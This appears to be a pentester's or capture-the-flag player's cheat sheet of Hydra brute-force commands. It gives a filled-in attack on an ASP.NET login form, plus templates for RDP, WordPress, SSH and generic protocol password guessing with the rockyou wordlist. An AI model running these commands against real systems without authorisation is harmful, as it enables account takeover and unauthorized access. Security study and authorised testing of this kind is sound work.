hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.60 http-post-form "/Account/login.aspx:__VIEWSTATE=95ZYxDxm74Lhbyjee8Ulme9lLXAd23uuk0PUc3Y%2F1XW4TJeGT7bdvAOuUJTIfe4ASHM8vAty8uMzn82A3zafq9%2F4iThU%2FC7j3MJS4kmVmKbiZsAVEsVzGr6t2AZBcG2rlfwjITTOcEUFFZBazJrYSxd5NcP%2BufiViloNW2NWn8TIfbk3Wrh2Fzj8yvyWI90drIvOArxgTQRl3rHTMdvX16M9MS83LHc6G9fd0O9QP%2FIHbwfshNWGAesZoVfOts0Ox3TJ8v3wSkxQqIYuE0bS0IB5HNoG%2FtuQ7yB3IpqxS0v68fRXlTV1UABIIcbrJHBFvkCeivvGy0XIWbxIoVV5C1P1kHVDJA28Hegat%2BwAJAULuzcy&__EVENTVALIDATION=DIJsYDDgicMtOPNaf4sO3hbIKJijnqdUhoSfihJVt%2BdxEZPZv3uqSWjiRAJOe5DNV3PIGseovVJFJ4%2F1MlzxIiGZ93ztZC0%2BUjF5xI4cVFNkwR2wXaKxR7H3a7RO0o5xqIUQx%2FSRcaKwWGL80aGyuMsGM4fLwIGvt77JBt50siwtrRqG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -V -I
hydra -P <wordlist> -v <ip> <protocol>
#	Brute force against a protocol of your choice
hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
#	You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
#	Attack a Windows Remote Desktop with a password list.
hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
#	Craft a more specific request for Hydra to brute force.

hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.22.242 ssh -V -I -F -t 64
